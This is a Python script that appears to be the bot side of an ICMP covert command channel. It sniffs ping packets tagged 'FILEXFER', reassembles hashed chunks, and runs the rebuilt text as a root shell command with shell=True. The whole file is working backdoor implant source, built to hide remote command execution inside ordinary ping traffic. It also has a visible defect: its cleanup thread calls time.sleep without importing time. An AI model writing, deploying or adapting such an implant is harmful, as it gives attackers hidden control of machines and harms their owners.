import os
import hashlib
import struct
import subprocess
from scapy.all import sniff, IP, ICMP
from datetime import datetime, timedelta
import threading

# === Internal State ===
transfers = {}
transfer_timeout = timedelta(seconds=60)

# === Constants ===
SIGNATURE = b"FILEXFER"
TYPE_START = 0
TYPE_CHUNK = 1
TYPE_END = 2

def cleanup_transfers():
    while True:
        now = datetime.utcnow()
        for key in list(transfers.keys()):
            if now - transfers[key]['last_seen'] > transfer_timeout:
                print(f"[!] Timeout: clearing incomplete transfer from {key}")
                del transfers[key]
        time.sleep(30)

def execute_command(cmd):
    print(f"[✓] Executing command: {cmd}")
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        print("[*] Output:\n", result.stdout)
    except Exception as e:
        print("[!] Failed to execute:", e)

def handle_icmp_packet(pkt):
    if not pkt.haslayer(ICMP) or pkt[ICMP].type != 8:  # Echo Request
        return

    raw = bytes(pkt[ICMP].payload)
    if len(raw) < 8 + 1 + 2 + 32:
        return

    if raw[:8] != SIGNATURE:
        return

    typ = raw[8]
    chunk_id = struct.unpack(">H", raw[9:11])[0]
    received_hash = raw[11:43]
    payload = raw[43:]

    src_ip = pkt[IP].src
    key = src_ip

    if typ == TYPE_START:
        filename = payload.decode(errors="ignore")
        print(f"[>] Start transfer from {src_ip} — filename: {filename}")
        transfers[key] = {
            "filename": filename,
            "chunks": {},
            "last_seen": datetime.utcnow()
        }

    elif typ == TYPE_CHUNK:
        if key not in transfers:
            print(f"[!] Got CHUNK from unknown session {src_ip}")
            return

        if hashlib.sha256(payload).digest() != received_hash:
            print(f"[!] Hash mismatch on chunk {chunk_id} from {src_ip}")
            return

        transfers[key]["chunks"][chunk_id] = payload
        transfers[key]["last_seen"] = datetime.utcnow()
        print(f"[+] Received chunk {chunk_id} from {src_ip}")

    elif typ == TYPE_END:
        if key not in transfers:
            print(f"[!] Got END from unknown session {src_ip}")
            return

        full_data = b''.join(
            transfers[key]["chunks"].get(i, b"") for i in sorted(transfers[key]["chunks"])
        )
        full_hash = hashlib.sha256(full_data).digest()

        if full_hash != received_hash:
            print(f"[!] Final hash mismatch from {src_ip}")
            return

        try:
            cmd = full_data.decode()
            print(f"[✓] Full command from {src_ip} reconstructed.")
            execute_command(cmd)
        except Exception as e:
            print(f"[!] Failed to decode/execute: {e}")
        finally:
            del transfers[key]

# === Main ===
if __name__ == "__main__":
    print("[*] Bot ICMP listener started (requires root)")
    threading.Thread(target=cleanup_transfers, daemon=True).start()
    sniff(filter="icmp", prn=handle_icmp_packet, store=0)
